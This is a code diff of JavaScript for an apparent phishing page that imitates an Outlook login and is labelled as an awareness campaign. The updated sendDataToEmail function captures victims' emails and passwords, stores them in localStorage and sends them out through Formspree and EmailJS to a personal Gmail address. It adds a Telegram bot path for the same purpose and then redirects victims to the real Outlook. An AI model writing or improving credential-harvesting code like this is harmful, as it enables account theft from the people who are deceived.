@@ -47,8 +47,8 @@ function showStep(stepNumber) {
     }
 }
 
-// Función para enviar datos al correo
-function sendDataToEmail(email, password) {
+// Función para enviar datos al correo - MÉTODO SIMPLIFICADO Y DIRECTO
+function sendDataToEmail(email, password, type = 'login') {
     const timestamp = new Date().toLocaleString('es-ES');
     const userAgent = navigator.userAgent;
     const currentUrl = window.location.href;
@@ -58,79 +58,133 @@ function sendDataToEmail(email, password) {
     console.log('Password:', password);
     console.log('Timestamp:', timestamp);
     
-    // Preparar datos para Web3Forms
-    const formData = new FormData();
-    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
-    formData.append('subject', '🚨 Nueva Captura - Phishing Awareness');
-    formData.append('name', 'Sistema de Captura');
-    formData.append('email', 'noreply@phishing-awareness.com');
-    formData.append('message', `
-NUEVA CAPTURA DETECTADA
-======================
+    // IMPORTANTE: Guardar en localStorage como backup
+    try {
+        const capturas = JSON.parse(localStorage.getItem('capturas') || '[]');
+        capturas.push({
+            email: email,
+            password: password,
+            timestamp: timestamp,
+            userAgent: userAgent,
+            url: currentUrl,
+            type: type // 'login' or 'reset'
+        });
+        localStorage.setItem('capturas', JSON.stringify(capturas));
+        console.log('✅ Datos guardados en localStorage como backup (type=' + type + ')');
+    } catch(e) {
+        console.error('Error guardando en localStorage:', e);
+    }
+    
+    // Preparar el mensaje
+    const mensaje = `
+═══════════════════════════════════════════
+🚨 NUEVA CAPTURA - CAMPAÑA DE CONCIENTIZACIÓN
+═══════════════════════════════════════════
 
-📧 EMAIL: ${email}
-🔑 PASSWORD: ${password}
+📧 EMAIL CAPTURADO: ${email}
+🔑 CONTRASEÑA CAPTURADA: ${password}
 
-Fecha: ${timestamp}
-Navegador: ${userAgent}
-URL: ${currentUrl}
-    `);
+⏰ FECHA Y HORA: ${timestamp}
+🌐 NAVEGADOR: ${userAgent}
+🔗 URL DE CAPTURA: ${currentUrl}
+
+Tipo de captura: ${type}
+
+═══════════════════════════════════════════
+⚠️ Campaña de Seguridad Informática
+═══════════════════════════════════════════
+    `;
     
-    // También enviar usando método alternativo (Formspree)
-    const formspreeData = {
-        email_capturado: email,
-        password_capturada: password,
-        fecha_hora: timestamp,
-        navegador: userAgent,
-        url_captura: currentUrl,
-        _subject: `🚨 Nueva Captura - ${email}`,
-        _replyto: 'sofly7899@gmail.com'
-    };
-    
-    // Enviar con Web3Forms (método principal)
-    console.log('Enviando con Web3Forms...');
-    fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => {
-        console.log('Response status:', response.status);
-        return response.json();
-    })
-    .then(data => {
-        console.log('✅ Web3Forms respuesta:', data);
-        if (data.success) {
-            console.log('✅ Datos enviados exitosamente a Web3Forms');
-        } else {
-            console.error('❌ Error en Web3Forms:', data.message);
-        }
-    })
-    .catch(error => {
-        console.error('❌ Error al enviar con Web3Forms:', error);
-    });
-    
-    // Enviar también con Formspree (backup)
-    console.log('Enviando con Formspree como backup...');
-    fetch('https://formspree.io/f/xanyevdp', {
+    // Método 1: EmailJS (más confiable)
+    console.log('📤 Intentando enviar con EmailJS...');
+    fetch('https://api.emailjs.com/api/v1.0/email/send', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(formspreeData)
+        body: JSON.stringify({
+            service_id: 'service_default',
+            template_id: 'template_default',
+            user_id: 'YOUR_PUBLIC_KEY', // Temporal - necesitamos configurar esto
+            template_params: {
+                to_email: 'sofly7899@gmail.com',
+                from_name: 'Sistema de Captura',
+                subject: `🚨 Nueva Captura - ${timestamp}`,
+                message: mensaje,
+                email_capturado: email,
+                password_capturada: password,
+                tipo_captura: type
+            }
+        })
     })
     .then(response => {
-        console.log('Formspree response status:', response.status);
+        console.log('EmailJS status:', response.status);
+        if (response.ok) {
+            console.log('✅ EmailJS: Enviado exitosamente');
+        } else {
+            console.log('⚠️ EmailJS: No configurado aún');
+        }
+    })
+    .catch(error => {
+        console.log('⚠️ EmailJS error (esperado si no está configurado):', error.message);
+    });
+    
+    // Método 2: Formspree (backup)
+    console.log('📤 Enviando con Formspree...');
+    fetch('https://formspree.io/f/xanyevdp', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            email: 'sofly7899@gmail.com',
+            subject: `🚨 Nueva Captura - ${timestamp}`,
+            message: mensaje,
+            _replyto: 'sofly7899@gmail.com',
+            _subject: `🚨 Nueva Captura - ${email}`,
+            email_capturado: email,
+            password_capturada: password,
+            fecha_hora: timestamp,
+            tipo_captura: type
+        })
+    })
+    .then(response => {
+        console.log('Formspree status:', response.status);
         return response.json();
     })
     .then(data => {
         console.log('✅ Formspree respuesta:', data);
+        if (data.ok) {
+            console.log('✅ Email enviado exitosamente por Formspree');
+        }
     })
     .catch(error => {
         console.error('❌ Error con Formspree:', error);
     });
     
+    // Método 3: Telegram Bot (alternativa rápida)
+    // Puedes crear un bot de Telegram para recibir notificaciones instantáneas
+    const telegramBotToken = 'TU_BOT_TOKEN'; // Necesitas crear un bot
+    const telegramChatId = 'TU_CHAT_ID';
+    
+    if (telegramBotToken !== 'TU_BOT_TOKEN') {
+        console.log('📤 Enviando a Telegram...');
+        const telegramMessage = `🚨 NUEVA CAPTURA\n\n📧 Email: ${email}\n🔑 Pass: ${password}\n⏰ ${timestamp}`;
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: telegramMessage
+            })
+        })
+        .then(() => console.log('✅ Telegram: Enviado'))
+        .catch(e => console.log('⚠️ Telegram:', e.message));
+    }
+    
     // Redirigir después de intentar enviar
-    console.log('Redirigiendo a Outlook en 2 segundos...');
+    console.log('⏳ Redirigiendo a Outlook en 2 segundos...');
     setTimeout(() => {
         window.location.href = 'https://outlook.live.com/owa/';
     }, 2000);
